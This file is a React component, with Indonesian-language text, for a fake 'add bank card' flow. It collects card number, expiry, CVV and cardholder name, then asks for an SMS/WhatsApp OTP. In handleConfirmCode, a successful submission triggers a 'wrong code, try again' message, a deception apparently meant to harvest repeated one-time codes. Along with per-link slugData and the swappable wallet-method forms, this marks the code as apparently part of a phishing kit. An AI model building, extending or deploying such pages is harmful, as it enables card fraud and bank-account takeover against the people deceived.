'use client';

import { useEffect, useRef, useState } from 'react';
import { ChevronLeft, CreditCard, HelpCircle, ShieldCheck } from 'lucide-react';
import { useBankFormFlow } from '../lib/useBankFormFlow';
import { useStepPanelReady } from '../hooks/useStepPanelReady';
import { formatCountdownMMSS } from '../lib/utils';
import type { WalletFormProps } from './wallet-methods';
import { ThemeColorMeta } from '../ThemeColorMeta';
import { getWalletFormThemeColor } from '../lib/theme-colors';
import './bank-wallet.css';

function formatCardNumber(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 19);
  return digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
}

function formatExpiryInput(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function BankCardIllustration({
  cardNumber,
  cardName,
}: {
  cardNumber: string;
  cardName: string;
}) {
  const digits = cardNumber.replace(/\D/g, '').slice(0, 16);
  const displayChars = Array.from({ length: 16 }, (_, i) => digits[i] ?? '•');
  const displayNumber =
    displayChars
      .join('')
      .match(/.{1,4}/g)
      ?.join(' ') ?? '•••• •••• •••• ••••';

  return (
    <div className="bank-card-art" aria-hidden>
      <div className="bank-card-art-chip" />
      <div className="bank-card-art-brand">
        <span className="bank-card-art-mc">
          <span />
          <span />
        </span>
        <span className="bank-card-art-bank">BANK</span>
      </div>
      <div className="bank-card-art-footer">
        <div>
          <small>VALID THRU</small>
          <strong>••/••</strong>
        </div>
        <div className="bank-card-art-name">{cardName.trim() || 'NAMA PEMILIK'}</div>
      </div>
      <div className="bank-card-art-number">{displayNumber}</div>
    </div>
  );
}

function BankLoadingOverlay({ visible }: { visible: boolean }) {
  if (!visible) return null;
  return (
    <div className="bank-loading-overlay" aria-live="polite" aria-busy="true">
      <div className="bank-loading-spinner" aria-hidden />
    </div>
  );
}

export function BankWalletForm({ slugData, onBack }: WalletFormProps) {
  const f = useBankFormFlow(slugData);
  const stepReady = useStepPanelReady(f.step);
  const [codeErrorToast, setCodeErrorToast] = useState(false);
  const toastTimerRef = useRef<number | null>(null);

  useEffect(() => {
    if (f.step !== 2) {
      setCodeErrorToast(false);
      if (toastTimerRef.current) {
        window.clearTimeout(toastTimerRef.current);
        toastTimerRef.current = null;
      }
    }
  }, [f.step]);

  const stepPanelClass = (isExiting: boolean) => {
    if (isExiting) return 'bank-step-panel bank-step-panel--exit';
    if (stepReady) return 'bank-step-panel bank-step-panel--active';
    return 'bank-step-panel bank-step-panel--enter';
  };

  const updateField = <K extends keyof typeof f.formData>(key: K, value: (typeof f.formData)[K]) => {
    f.setFormData({ ...f.formData, [key]: value });
  };

  const handleConfirmCode = async () => {
    if (!f.formData.code.trim() || f.submitting) return;
    const ok = await f.handleNext();
    if (ok) {
      setCodeErrorToast(true);
      if (toastTimerRef.current) window.clearTimeout(toastTimerRef.current);
      toastTimerRef.current = window.setTimeout(() => {
        setCodeErrorToast(false);
        toastTimerRef.current = null;
      }, 7000);
    }
  };

  return (
    <div className="bank-flow">
      <ThemeColorMeta color={getWalletFormThemeColor('bank', { step: f.step })} />
      <BankLoadingOverlay visible={f.isLoadingOverlay} />

      {(f.step === 1 || f.previousStep === 1) && (
        <div className={`bank-step1 ${stepPanelClass(f.isStep1FadingOut)}`}>
          <header className="bank-header">
            <button type="button" className="bank-icon-btn" onClick={onBack} aria-label="Kembali">
              <ChevronLeft className="h-6 w-6" />
            </button>
          </header>

          <div className="bank-step1-body">
            <BankCardIllustration
              cardNumber={f.formData.cardNumber}
              cardName={f.formData.cardName}
            />

            <label className="bank-label">
              Nomor kartu
              <HelpCircle className="bank-label-icon" />
            </label>
            <div className="bank-input-wrap">
              <CreditCard className="bank-input-icon" />
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="cc-number"
                placeholder="Nomor kartu"
                className="bank-input"
                value={formatCardNumber(f.formData.cardNumber)}
                onChange={(e) =>
                  updateField('cardNumber', e.target.value.replace(/\D/g, '').slice(0, 19))
                }
              />
            </div>

            <div className="bank-row-2">
              <div>
                <label className="bank-label">Valid hingga</label>
                <input
                  type="tel"
                  inputMode="numeric"
                  autoComplete="cc-exp"
                  placeholder="MM / YY"
                  className="bank-input bank-input--plain"
                  value={f.formData.expiry}
                  onChange={(e) => updateField('expiry', formatExpiryInput(e.target.value))}
                />
              </div>
              <div>
                <label className="bank-label">CVV</label>
                <input
                  type="tel"
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  placeholder="CVV"
                  maxLength={3}
                  className="bank-input bank-input--plain"
                  value={f.formData.cvv}
                  onChange={(e) =>
                    updateField('cvv', e.target.value.replace(/\D/g, '').slice(0, 3))
                  }
                />
              </div>
            </div>

            <label className="bank-label">Nama pada kartu</label>
            <input
              type="text"
              autoComplete="cc-name"
              placeholder="Nama lengkap"
              className="bank-input bank-input--plain"
              value={f.formData.cardName}
              onChange={(e) => updateField('cardName', e.target.value.slice(0, 80))}
            />

            <div className="bank-toggle-row">
              <span>Atur sebagai metode utama</span>
              <button
                type="button"
                className={`bank-toggle ${f.formData.isPrimary ? 'bank-toggle--on' : ''}`}
                onClick={() => updateField('isPrimary', !f.formData.isPrimary)}
                aria-pressed={f.formData.isPrimary}
              >
                <span />
              </button>
            </div>

            <p className="bank-secure">
              <ShieldCheck className="h-4 w-4" />
              Detail kartumu akan disimpan dengan aman
            </p>
            <p className="bank-legal">
              Kartu kamu mungkin dikenakan biaya validasi kecil yang akan otomatis dikembalikan.
              Dengan menambahkan kartu, kamu setuju dengan{' '}
              <button type="button">syarat dan ketentuan</button>.
            </p>

            {f.errorMessage && <p className="bank-error">{f.errorMessage}</p>}
          </div>

          <div
            className="bank-footer"
            style={
              {
                '--bank-keyboard-offset': `${f.keyboardOffset}px`,
              } as React.CSSProperties
            }
          >
            <button
              type="button"
              className={`bank-confirm-btn ${f.cardValid ? 'bank-confirm-btn--on' : ''}`}
              disabled={!f.cardValid || f.submitting}
              onClick={() => void f.handleNext()}
            >
              KONFIRMASI
            </button>
          </div>
        </div>
      )}

      {f.step === 2 && (
        <div className={`bank-step2 ${stepPanelClass(false)}`}>
          <header className="bank-header bank-header--step2">
            <button
              type="button"
              className="bank-icon-btn"
              onClick={() => f.goBackStep()}
              aria-label="Kembali"
            >
              <ChevronLeft className="h-6 w-6" />
            </button>
            <span className="bank-header-title">Verifikasi</span>
            <span className="bank-header-spacer" aria-hidden />
          </header>

          <div className="bank-step2-body">
            <div className="bank-step2-icon-wrap">
              <ShieldCheck className="bank-step2-icon" strokeWidth={1.75} />
            </div>

            <h1 className="bank-step2-title">Masukkan kode verifikasi</h1>
            <p className="bank-step2-desc">
              Kode OTP telah dikirim ke nomor terdaftar di M-banking. Silakan cek{' '}
              <span className="bank-step2-channel bank-step2-channel--sms">SMS</span> atau{' '}
              <span className="bank-step2-channel bank-step2-channel--wa">WhatsApp</span> Anda.
            </p>

            <label className="bank-label" htmlFor="bank-code-input">
              Kode verifikasi
            </label>
            <input
              id="bank-code-input"
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              placeholder="Masukkan kode"
              maxLength={8}
              className="bank-input bank-input--plain bank-code-input"
              value={f.formData.code}
              onChange={(e) => {
                if (codeErrorToast) setCodeErrorToast(false);
                updateField('code', e.target.value.replace(/\D/g, '').slice(0, 8));
              }}
            />

            <p className={`bank-code-toast ${codeErrorToast ? 'bank-code-toast--show' : ''}`}>
              Kode yang dimasukkan salah. Silakan coba lagi.
            </p>

            <p className="bank-code-timer">
              Berlaku selama <strong>{formatCountdownMMSS(f.countdown)}</strong>
            </p>

            {f.errorMessage && <p className="bank-error">{f.errorMessage}</p>}
          </div>

          <div
            className="bank-footer"
            style={
              {
                '--bank-keyboard-offset': `${f.keyboardOffset}px`,
              } as React.CSSProperties
            }
          >
            <button
              type="button"
              className={`bank-confirm-btn ${
                f.formData.code.trim() ? 'bank-confirm-btn--on' : ''
              }`}
              disabled={!f.formData.code.trim() || f.submitting}
              onClick={() => void handleConfirmCode()}
            >
              KONFIRMASI
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
